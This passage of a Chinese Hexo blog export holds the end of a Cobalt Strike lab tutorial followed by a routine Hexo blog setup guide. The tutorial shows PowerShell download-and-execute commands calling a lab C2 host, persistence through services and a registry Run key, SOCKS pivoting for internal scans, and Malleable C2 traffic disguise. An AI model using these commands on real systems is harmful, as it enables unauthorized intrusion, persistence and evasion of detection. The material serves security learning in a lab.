<p><img src="/2020/07/03/Cobaltstrike/image-20200627163937927.png" alt="image-20200627163937927"></p>
<p>然后在这台kali上启动一个客户端，这里的host是本地的，点击connect，进入后可以在下图可以看到此时是没有beacon的</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627164255596.png" alt="image-20200627164255596"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627164329043.png" alt="image-20200627164329043"></p>
<p>创建listener</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627164442315.png" alt="image-20200627164442315"></p>
<p> 第二步，切换到第一台kali</p>
<p>在上一台已经拿到beacon的客户端上，创建新的连接，连接到172.16.12.135这台kali启动的teamserver上</p>
<p>点击左上角，cobalt strike-&gt;new connection</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627164742511.png" alt="image-20200627164742511"></p>
<p>在左下角我们可以看到，在客户端这儿是可以切换两台teamserver的</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627164900333.png" alt="image-20200627164900333"></p>
<p>切换至<a href="mailto:mys3t@172.16.12.137">mys3t@172.16.12.137</a>，选中一个beacon，右键spawn</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627165033323.png" alt="image-20200627165033323"></p>
<p>  然后选中在172.16.12.135的cs客户端上创建的listener</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627165115096.png" alt="image-20200627165115096"></p>
<p> 第三步，切换到172.16.12.135的cs客户端</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627165231755.png" alt="image-20200627165231755"></p>
<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>在渗透过程中拿到目标权限只是开始，如果管理员修复了漏洞权限就丢失了，这时候要想持续在内网进行渗透就需要权限维持。需要了解cs的权限维持的手段，熟悉win下注册表、开机启动项以及各种渗透中常见的命令。</p>
<p><strong>一、设置powershell脚本开机自启动后门</strong></p>
<p>启动teamserver及客户端</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627171252453.png" alt="image-20200627171252453"></p>
<p>点击Attacks-&gt;web driver-by -&gt;script web delivery</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627171435897.png" alt="image-20200627171435897"></p>
<p>点击launch后出现如下</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627171506690.png" alt="image-20200627171506690"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;172.16.12.137:80&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure>
<p>复制到靶机运行后：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627171631310.png" alt="image-20200627171631310"></p>
<p>此时拿到了普通用户权限的beacon</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627174534770.png" alt="image-20200627174534770"></p>
<p>打开becaon shell输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell sc create &quot;TEST&quot; binpath&#x3D; &quot;cmd &#x2F;c start powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;172.16.12.137:80&#x2F;a&#39;))\&quot;&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627175322499.png" alt="image-20200627175322499"></p>
<p>切换到靶机，查看服务，输入services.msc命令即可,  在服务中找到了名为TEST的项</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627175439053.png" alt="image-20200627175439053"></p>
<p>此时启动类型还是手动，设置为自动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon  shell sc config &quot;TEST&quot; start&#x3D; auto</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627175557809.png" alt="image-20200627175557809"></p>
<p> 在服务中右键-》刷新，可以看到类型已经是自动了</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627175648761.png" alt="image-20200627175648761"></p>
<p>启动服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell net start &quot;TEST&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627175937521.png" alt="image-20200627175937521"></p>
<p>然后重启靶机，通过powershell留开机自启动服务，当目标主机重启电脑之后,不断向攻击机器发送请求数据包，重新拿到控制权限。</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200627180708776.png" alt="image-20200627180708776"></p>
<p><strong>二、通过service留自启动后门，生成一个exe后门</strong></p>
<p>Attacks-&gt;packages-&gt;windows executable</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628210956455.png" alt="image-20200628210956455"></p>
<p>然后右键explore&gt;file browser</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628211202167.png" alt="image-20200628211202167"></p>
<p>把生成的exe程序上传到靶机</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628211248927.png" alt="image-20200628211248927"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628211640028.png" alt="image-20200628211640028"></p>
<p>  创建项及路径：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell sc create &quot;server power&quot; binpath&#x3D; &quot;C:\test.exe&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628211758573.png" alt="image-20200628211758573"></p>
<p>设置服务的描述字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell sc description &quot;server power&quot; &quot;description&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628211849270.png" alt></p>
<p> 设置服务为自启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell sc config &quot;server power&quot; start&#x3D; auto</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628211945427.png" alt="image-20200628211945427"></p>
<p>在靶机的服务中可以看到server power的项</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628212055324.png" alt="image-20200628212055324"></p>
<p> 然后启动服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell net start &quot;server power&quot;</span><br></pre></td></tr></table></figure>
<p>此时注意到又拿了一个beacon</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628212123186.png" alt="image-20200628212123186"></p>
<p> 接下来还是重启靶机,重新获取控制。</p>
<p><strong>三、直接写注册表</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v &quot;keyname&quot; &#x2F;t REG_SZ &#x2F;d &quot;C:\Windows\artifact.exe&quot; &#x2F;f</span><br></pre></td></tr></table></figure>
<h2 id="代理与C2"><a href="#代理与C2" class="headerlink" title="代理与C2"></a>代理与C2</h2><h4 id="代理和powershell"><a href="#代理和powershell" class="headerlink" title="代理和powershell"></a>代理和powershell</h4><p>代理（Proxy）也称网络代理，是一种特殊的网络服务，允许一个网络终端（一般为客户端）通过这个服务与另一个网络终端（一般为服务器）进行非直接的连接。</p>
<p>在已拿到beacon情况下：</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628223544318.png" alt="image-20200628223544318"></p>
<p><strong>利用socks代理客户端直接把各类渗透工具带进目标进网：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在beacon shell中输入socks 1234,1234为端口，我们可以随意设置，只要不冲突就行.</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628223827031.png" alt></p>
<p>接下来可以使用proxychains,它是一个开源代理工具，能够强制使任何应用的TCP连接使用SOCKS4,SOCKS或者HTTP(S)代理进行连接。</p>
<p>ProxyChains运行的所有配置都在/etc/proxychains.conf中，我们需要在这个文件中进行设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br><span class="line">在最后一行输入sosks4  127.0.0.1  1234</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628224029301.png" alt="image-20200628224029301"></p>
<p> 设置好后，我们来看看proxychains使用代理访问的情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令形式为：proxychains &lt;运行的命令&gt; &lt;命令参数&gt;</span><br></pre></td></tr></table></figure>
<p>比如我们可以把nmap代理到内网使用，用来扫描内网存活的主机：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在beaconshell中查看靶机ip</span><br><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628224233528.png" alt></p>
<p>接下来就把nmap代理到这个网段进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sP 172.16.12.0&#x2F;24</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628224559889.png" alt="image-20200628224559889"></p>
<p>把其他工具代理到内网也是一样的道理。</p>
<p>把msf代理到内网可以使用这种办法，也可以直接利用隧道把整个msf带进目标内网：</p>
<p>点击cs菜单上的view-&gt;proxy pivots，可以看到代理情况</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628224734881.png" alt="image-20200628224734881"></p>
<p>然后点击下方的tunnel，复制命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setg Proxies socks4:172.16.12.137:1234</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628224839575.png" alt="image-20200628224839575"></p>
<p>启动msf</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628225004839.png" alt="image-20200628225004839"></p>
<p>  把上一步复制的命令粘贴进来</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628225146945.png" alt="image-20200628225146945"></p>
<p> 这样就把msf代理到内网中去了，接下来就可以使用msf对内网中的机器进行渗透。</p>
<h4 id="MallelableC2配置与使用"><a href="#MallelableC2配置与使用" class="headerlink" title="MallelableC2配置与使用"></a>MallelableC2配置与使用</h4><p>Malleable C2就是Malleable Command and Control，Beacon中的http通讯由Malleable-C2配置文件控制，在启动teamserver时来指定我们的配置文件，每个CS实例只能载入一个配置文件。用CobaltStrike的 Malleable-C2-Profiles伪装流量，让我们的通讯更加隐蔽。</p>
<p>前提已拿到靶机beacon</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628225757408.png" alt="image-20200628225757408"></p>
<p>使用科来专家增强版对虚拟机网络进行抓包</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628225923211.png" alt="image-20200628225923211"></p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628231335956.png" alt="image-20200628231335956"></p>
<p>使用CobaltStrike的 Malleable-C2-Profiles伪装流量， Beacon中的http通讯由Malleable-C2配置文件控制，在启动teamserver时来指定我们的配置文件,每个CS只能载入一个配置文件。其中目录下的 c2lint 文件可以检测配置文件的语法问题和测试。</p>
<p>github上的Malleable-C2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rsmudge&#x2F;Malleable-C2-Profiles</span><br></pre></td></tr></table></figure>
<p>使用时的语法如下所示，即在启动teamserver时在最后指定profile的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  172.16.12.137  password  &#x2F;root&#x2F;cs&#x2F;Malleable-C2-Profiles-master&#x2F;normalicrosoftupdate_getonly.profile</span><br></pre></td></tr></table></figure>
<p>再次抓包发现，已伪装成功</p>
<p><img src="/2020/07/03/Cobaltstrike/image-20200628232750307.png" alt="image-20200628232750307"></p>
<hr>
<p>根据中华人民共和国《网络安全法》相关政策规定，本文章只做安全预警，不被允许通过本文章技术手段进行非法行为，使用技术的风险由您自行承担。</p>
<hr>
]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>Cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title>博客搭建过程</title>
    <url>/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Win10专业版，64位</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>1.注册GitHub账号</p>
<p>2.下载安装Git for windows，一路next即可。</p>
<p>验证安装：任何位置鼠标右击出现git bash here</p>
<p>cmd下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure>
<p>3.下载安装node.js</p>
<p>验证安装，cmd下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>
<p>4.npm会默认安装</p>
<h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>在GitHub上创建repository。</p>
<p>repository的名字必须为yourname.github.io，yourname为GitHub用户名，也就是访问的博客地址。</p>
<p>注册的邮箱一定要验证，不然不会成功。</p>
<h2 id="配置SSH-key"><a href="#配置SSH-key" class="headerlink" title="配置SSH key"></a>配置SSH key</h2><p>用于本地与GitHub进行数据交换。</p>
<h4 id="生成并配置key"><a href="#生成并配置key" class="headerlink" title="生成并配置key"></a>生成并配置key</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;xxx&quot;		#你的github用户名</span><br><span class="line">git config --global user.email  &quot;xxx@qq.com&quot;	#填写你的github注册邮箱</span><br></pre></td></tr></table></figure>
<p>生成ssh密钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;. ssh								#检查本机已存在的ssh密钥</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;				#生成密钥</span><br></pre></td></tr></table></figure>
<p>连续按回车三次（使用默认ssh密钥生成策略），密钥生成成功，存于本地用户目录(~)，打开.ssh\id_rsa.pub文件，并复制其中内容。</p>
<p>打开你的github主页，进入个人设置-&gt; SSH and GPG keys -&gt; New SSH key： title任意填写，将内容复制到key中即可。</p>
<h4 id="测试ssh"><a href="#测试ssh" class="headerlink" title="测试ssh"></a>测试ssh</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com 		#注意邮箱地址不用改</span><br></pre></td></tr></table></figure>
<p>如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>
<h2 id="使用Hexo"><a href="#使用Hexo" class="headerlink" title="使用Hexo"></a>使用Hexo</h2><p>以下所有命令在git bash下运行</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
<p>验证安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure>
<h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>在本地主机上建立一个blog文件夹，用于日后代码，博客的存放，进入此目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
<p>此目录会自动生成hexo相关文件。</p>
<p>注：此处目录中会存在一个_config.yml的文件，为hexo的主配置文件，以后我们称其为站点配置文件。</p>
<h4 id="安装npm插件"><a href="#安装npm插件" class="headerlink" title="安装npm插件"></a>安装npm插件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm install hexo-generator-index --save</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line">npm install hexo-generator-category --save</span><br><span class="line">npm install hexo-generator-tag --save</span><br><span class="line">npm install hexo-server --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-deployer-heroku --save</span><br><span class="line">npm install hexo-deployer-rsync --save</span><br><span class="line">npm install hexo-deployer-openshift --save</span><br><span class="line">npm install hexo-renderer-marked@0.2 --save</span><br><span class="line">npm install hexo-renderer-stylus@0.2 --save</span><br><span class="line">npm install hexo-generator-feed@1 --save</span><br><span class="line">npm install hexo-generator-sitemap@1 --save</span><br></pre></td></tr></table></figure>
<h4 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h4><p>blog目录中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g	#生成静态页面</span><br><span class="line">hexo s	#启动本地预览服务</span><br></pre></td></tr></table></figure>
<p>执行命令后，hexo会在public文件夹生成相关html文件，用于本地预览与后期提交github。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">浏览器访问http:&#x2F;&#x2F;127.0.0.1:4000，即可看到hexo默认生成页面hello,world</span><br></pre></td></tr></table></figure>
<h2 id="上传GitHub的配置"><a href="#上传GitHub的配置" class="headerlink" title="上传GitHub的配置"></a>上传GitHub的配置</h2><p>配置站点配置文件_config.yml中的deploy部分:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:yourname&#x2F;yourname.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<p>安装上传插件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<p>上传命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>在hexo根目录下，会将有所改动的内容全部提交至github</p>
<h2 id="更改Hexo主题及优化"><a href="#更改Hexo主题及优化" class="headerlink" title="更改Hexo主题及优化"></a>更改Hexo主题及优化</h2><h4 id="hexo目录结构"><a href="#hexo目录结构" class="headerlink" title="hexo目录结构"></a>hexo目录结构</h4><p><img src="/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/image-20200703214804373.png" alt="image-20200703214804373"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy：执行hexo deploy命令部署到GitHub上的内容目录;</span><br><span class="line"></span><br><span class="line">public：执行hexo generate命令，输出的静态网页内容目录;</span><br><span class="line"></span><br><span class="line">scaffolds：layout模板文件目录，其中的md文件可以添加编辑;</span><br><span class="line"></span><br><span class="line">scripts：扩展脚本目录，这里可以自定义一些javascript脚本;</span><br><span class="line"></span><br><span class="line">source：文章源码目录，该目录下的markdown和html文件均会被hexo处理。该页面对应repo的根目录，404文件、favicon.ico文件，CNAME文件等都应该放这里;</span><br><span class="line"></span><br><span class="line">drafts：草稿文章;</span><br><span class="line"></span><br><span class="line">posts：发布文章;</span><br><span class="line"></span><br><span class="line">themes：主题文件目录;</span><br><span class="line"></span><br><span class="line">_config.yml：全局配置文件，大多数的设置都在这里;</span><br><span class="line"></span><br><span class="line">package.json：应用程序数据，指明hexo的版本等信息，类似于一般软件中的关于按钮;</span><br></pre></td></tr></table></figure>
<h4 id="next主题目录结构"><a href="#next主题目录结构" class="headerlink" title="next主题目录结构"></a>next主题目录结构</h4><p><img src="/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/image-20200703215229186.png" alt="image-20200703215229186"></p>
<h4 id="主题下载"><a href="#主题下载" class="headerlink" title="主题下载"></a>主题下载</h4><p>进入blog根目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;iissnan&#x2F;hexo-theme-next themes&#x2F;next</span><br></pre></td></tr></table></figure>
<p>执行完成后会在blog\themes\目录下生成next目录。</p>
<p>next目录下也会存在一个_config.yml文件，这是next主题的主配置文件，称为主题配置文件。</p>
<h4 id="主题应用"><a href="#主题应用" class="headerlink" title="主题应用"></a>主题应用</h4><p>配置站点配置文件，寻找theme字段，将其值修改为next（next前后都有一个空格，否则会报错）。</p>
<h4 id="主题预览"><a href="#主题预览" class="headerlink" title="主题预览"></a>主题预览</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clean			#清除缓存</span><br><span class="line">hexo g				#重新生成代码</span><br><span class="line">hexo s				#部署到本地</span><br><span class="line"></span><br><span class="line">浏览器访问http:&#x2F;&#x2F;127.0.0.1:4000查看效果</span><br></pre></td></tr></table></figure>
<h4 id="主题简单优化"><a href="#主题简单优化" class="headerlink" title="主题简单优化"></a>主题简单优化</h4><h5 id="设置布局："><a href="#设置布局：" class="headerlink" title="设置布局："></a>设置布局：</h5><p>主题配置文件中，寻找Scheme字段，next提供三种默认主题布局，将你想使用的布局取消注释即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#scheme: Muse   </span><br><span class="line">#scheme: Mist</span><br><span class="line">scheme: Pisces</span><br></pre></td></tr></table></figure>
<p>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白;</p>
<p>Mist - Muse 的紧凑版本，整洁有序的单栏外观;</p>
<p>Pisces - 双栏 Scheme，小家碧玉似的清新.</p>
<h5 id="设置显示语言"><a href="#设置显示语言" class="headerlink" title="设置显示语言"></a>设置显示语言</h5><p>站点配置文件中，寻找language 字段，设置其值为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">language: zh-Hans</span><br></pre></td></tr></table></figure>
<p>语言文件位于hexo\themes\next\languages目录下</p>
<h5 id="设置侧边栏"><a href="#设置侧边栏" class="headerlink" title="设置侧边栏"></a>设置侧边栏</h5><p>主题配置文件中，设置侧边栏在左侧或右侧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sidebar:</span><br><span class="line">  # Sidebar Position, available value: left | right (only for Pisces | Gemini).</span><br><span class="line">  position: left</span><br><span class="line">  #position: right</span><br></pre></td></tr></table></figure>
<p>设置侧边栏显示时机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post - 默认行为，在文章页面（拥有目录列表）时显示</span><br><span class="line">always - 在所有页面中都显示</span><br><span class="line">hide - 在所有页面中都隐藏（可以手动展开）</span><br><span class="line">remove - 完全移除</span><br></pre></td></tr></table></figure>
<h4 id="设置主题菜单"><a href="#设置主题菜单" class="headerlink" title="设置主题菜单"></a>设置主题菜单</h4><p>主题配置文件中，寻找menu字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: &#x2F;						#主页</span><br><span class="line">  #archives: &#x2F;archives			#归档页</span><br><span class="line">  about: &#x2F;about				#关于页</span><br><span class="line">  #categories: &#x2F;categories		#分类页</span><br><span class="line">  tags: &#x2F;tags					#标签页</span><br><span class="line">  #commonweal: &#x2F;404.html		#公益404</span><br></pre></td></tr></table></figure>
<p>除主页与归档页外，其余页面需要手动创建。每行中||后的内容为指定此menu的图标</p>
<h5 id="添加标签页"><a href="#添加标签页" class="headerlink" title="添加标签页"></a>添加标签页</h5><p>进入blog根目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure>
<p>命令执行后，hexo\source\tags目录中生成index.md文件。</p>
<p>修改此index.md文件为(添加type行)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">date: 2016-11-15 19:10:05</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>对于blog\source_post目录下具体博客文章设置tags(设置tags行)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<h5 id="添加分类页面"><a href="#添加分类页面" class="headerlink" title="添加分类页面"></a>添加分类页面</h5><p>进入blog根目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure>
<p>命令执行后，blog\source\categories目录中生成index.md文件。</p>
<p>修改此index.md文件为(添加categories行)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: categories</span><br><span class="line">date: 2016-11-15 19:11:13</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>对于blog\source_post目录下具体博客文章设置categories(设置categories行)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br><span class="line">categories: 搭建博客</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<h5 id="添加关于页面"><a href="#添加关于页面" class="headerlink" title="添加关于页面"></a>添加关于页面</h5><p>进入blog根目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure>
<p>命令执行后，hexo\source\about目录中生成index.md文件。</p>
<p>修改index.md文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: about</span><br><span class="line">date: 2016-11-15 19:08:50</span><br><span class="line">---</span><br><span class="line">## 关于我</span><br><span class="line"></span><br><span class="line">一只学习的小菜鸟，欢迎分享知识。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QQ：</span><br><span class="line">Email:</span><br></pre></td></tr></table></figure>
<h5 id="首页文章只显示一部分"><a href="#首页文章只显示一部分" class="headerlink" title="首页文章只显示一部分"></a>首页文章只显示一部分</h5><p>在博客文章适当位置添加<!--more--> 标记即可</p>
<h5 id="博客中添加视频"><a href="#博客中添加视频" class="headerlink" title="博客中添加视频"></a>博客中添加视频</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe </span><br><span class="line">	height&#x3D;500 width&#x3D;100% </span><br><span class="line">	src&#x3D;&quot;https:&#x2F;&#x2F;xxxxx&quot; </span><br><span class="line">	frameborder&#x3D;0 allowfullscreen&gt;</span><br><span class="line">&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
<h2 id="markdown本地图片问题"><a href="#markdown本地图片问题" class="headerlink" title="markdown本地图片问题"></a>markdown本地图片问题</h2><h4 id="开启-post-asset-folder"><a href="#开启-post-asset-folder" class="headerlink" title="开启 post_asset_folder"></a>开启 post_asset_folder</h4><p>在站点配置文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure>
<h4 id="安装-hexo-asset-image-插件"><a href="#安装-hexo-asset-image-插件" class="headerlink" title="安装 hexo-asset-image 插件"></a>安装 hexo-asset-image 插件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install https:&#x2F;&#x2F;github.com&#x2F;CodeFalling&#x2F;hexo-asset-image --save</span><br></pre></td></tr></table></figure>
<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>1、在与 _posts/my_article.md的平级位置上创建文件夹 my_article；<br>2、放置 my_article.md 文件中引用到的图片，例如 my_pic.jpg；<br>3、在 my_article.md 以 <img src="/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/my_pic.jpg" alt="my_pic"> 方式引用。</p>
<h4 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new post 测试文章</span><br></pre></td></tr></table></figure>
<p>执行命令后会在blog/source/_post目录下生成<code>测试文章</code>.md，已经<code>测试文章</code>文件夹。</p>
<p>其中<code>测试文章</code>文件夹中存放markdown中使用的图片，具体方法为</p>
<p><img src="/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/pic.png" alt>  //此处为测试文章文件夹</p>
<h2 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new &quot;postName&quot;			#新建文章</span><br><span class="line">hexo new page &quot;pageName&quot;	#新建页面</span><br><span class="line">hexo generate				#生成静态页面至public目录</span><br><span class="line">hexo server					#开启预览访问端口（默认端口4000，&#39;ctrl + c&#39;关闭server）</span><br><span class="line">hexo deploy					#部署到GitHub</span><br><span class="line">hexo help					#查看帮助</span><br><span class="line">hexo version				#查看Hexo的版本</span><br><span class="line">hexo clean					#清除缓存</span><br><span class="line"></span><br><span class="line">缩写：</span><br><span class="line">hexo n &#x3D;&#x3D; hexo new</span><br><span class="line">hexo g &#x3D;&#x3D; hexo generate</span><br><span class="line">hexo s &#x3D;&#x3D; hexo server</span><br><span class="line">hexo d &#x3D;&#x3D; hexo deploy</span><br><span class="line"></span><br><span class="line">组合命令：</span><br><span class="line">hexo s -g					#生成并本地预览</span><br><span class="line">hexo d -g					#生成并上传</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>中国菜刀分析及隐藏后门</title>
